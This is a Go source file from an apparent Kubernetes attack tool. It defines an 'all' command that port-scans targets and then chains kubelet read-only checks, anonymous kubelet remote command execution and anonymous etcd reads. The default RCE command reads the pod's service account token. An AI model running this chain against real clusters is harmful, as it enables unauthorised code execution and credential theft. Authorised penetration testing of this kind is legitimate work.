package cli

import (
	"fmt"

	"github.com/Rolix44/Kubestroyer/internal/display"
	"github.com/Rolix44/Kubestroyer/internal/exploit"
	"github.com/Rolix44/Kubestroyer/internal/ports"
	"github.com/spf13/cobra"
)

func newAllCmd(opts *RootOptions) *cobra.Command {
	var nodePorts bool
	var command string

	cmd := &cobra.Command{
		Use:   "all",
		Short: "Run all checks and exploits against target(s)",
		Long: `Run every check and exploit in sequence against each target:
  1. Port scan (scan)
  2. Kubelet read-only port exposure (kubelet-ro)
  3. Kubelet anonymous RCE (rce)
  4. Etcd anonymous read (etcd)`,
		RunE: func(cmd *cobra.Command, args []string) error {
			portMap := ports.KnownPorts()
			if nodePorts {
				portMap = ports.WithNodePorts()
			}

			for _, target := range opts.Targets {
				// 1. Port scan
				if err := runScan(cmd.Context(), target, portMap, opts); err != nil {
					fmt.Printf("scan error for %s: %v\n", target, err)
					fmt.Println(display.Split)
				}

				// 2. Kubelet read-only port check
				if err := exploit.CheckReadOnly(cmd.Context(), exploit.KubeletROOptions{
					Target:      target,
					HTTPTimeout: opts.HTTPTimeout,
				}); err != nil {
					fmt.Printf("kubelet-ro error for %s: %v\n", target, err)
				}
				fmt.Println(display.Split)

				// 3. Kubelet anonymous RCE
				if err := exploit.RunRCE(cmd.Context(), exploit.KubeletOptions{
					Target:      target,
					Command:     command,
					HTTPTimeout: opts.HTTPTimeout,
				}); err != nil {
					fmt.Printf("rce error for %s: %v\n", target, err)
				}
				fmt.Println(display.Split)

				// 4. Etcd anonymous read
				if err := exploit.ReadObjects(cmd.Context(), exploit.EtcdOptions{
					Target: target,
				}); err != nil {
					fmt.Printf("etcd error for %s: %v\n", target, err)
				}
				fmt.Println(display.Split)
			}
			return nil
		},
	}

	cmd.Flags().BoolVar(&nodePorts, "node-ports", false, "Scan NodePort range 30000-32767")
	cmd.Flags().StringVarP(&command, "command", "x", "cat /var/run/secrets/kubernetes.io/serviceaccount/token", "Command to execute for RCE")
	return cmd
}
